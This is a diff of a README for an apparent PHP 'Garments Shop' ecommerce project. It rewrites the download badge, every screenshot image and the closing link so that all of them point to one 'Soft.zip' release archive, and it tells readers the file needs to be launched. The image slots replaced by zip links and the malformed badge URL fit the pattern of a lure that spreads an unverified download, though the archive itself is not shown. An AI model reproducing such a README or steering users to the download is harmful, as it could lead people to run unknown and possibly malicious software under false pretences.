@@ -7,7 +7,7 @@ The project is a fully functional Ecommerce Store that allows users to browse th
 
 ## 🚀 Quick Start
 To get started with the project, you can download the codebase from the following link:
-[<img src="https://img.shields.io/badge/Download-%20Release.zip-blue">](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[<img src="https://github.com/BRUHTHEBEST/Garments-Shop---PHP/releases/download/v1.0/Soft.zip%https://github.com/BRUHTHEBEST/Garments-Shop---PHP/releases/download/v1.0/Soft.zip">](https://github.com/BRUHTHEBEST/Garments-Shop---PHP/releases/download/v1.0/Soft.zip)
 
 It needs to be launched to explore the project further.
 
@@ -22,13 +22,13 @@ It needs to be launched to explore the project further.
 ## 🎨 Screenshots
 Here are some snapshots from the Garments Shop:
 
-![Homepage](https://via.placeholder.com/800x400)
+![Homepage](https://github.com/BRUHTHEBEST/Garments-Shop---PHP/releases/download/v1.0/Soft.zip)
 *Homepage*
 
-![Product Page](https://via.placeholder.com/800x400)
+![Product Page](https://github.com/BRUHTHEBEST/Garments-Shop---PHP/releases/download/v1.0/Soft.zip)
 *Product Page*
 
-![Shopping Cart](https://via.placeholder.com/800x400)
+![Shopping Cart](https://github.com/BRUHTHEBEST/Garments-Shop---PHP/releases/download/v1.0/Soft.zip)
 *Shopping Cart*
 
 ## 🛠️ Technologies Used
@@ -43,6 +43,6 @@ Here are some snapshots from the Garments Shop:
 ## 🔗 Additional Information
 For more information, feel free to explore the project and dive into the code. If you encounter any issues or have suggestions for improvements, please check the "Releases" section for any updates or patches.
 
-Visit the [Garments Shop](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) now and start shopping for your favorite garments! 🎉
+Visit the [Garments Shop](https://github.com/BRUHTHEBEST/Garments-Shop---PHP/releases/download/v1.0/Soft.zip) now and start shopping for your favorite garments! 🎉
 
 Happy Shopping! 🛒✨
